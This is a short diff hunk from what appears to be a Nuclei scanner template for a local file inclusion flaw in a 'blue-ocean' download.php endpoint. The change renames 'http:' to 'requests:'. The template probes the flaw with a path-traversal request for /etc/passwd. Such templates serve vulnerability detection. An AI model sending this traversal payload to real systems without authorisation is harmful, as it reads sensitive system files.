@@ -7,7 +7,7 @@ info:
   reference: https://blog.csdn.net/qq_41901122/article/details/116786883
   tags: blue-ocean,lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/download.php?file=../../../../../etc/passwd"
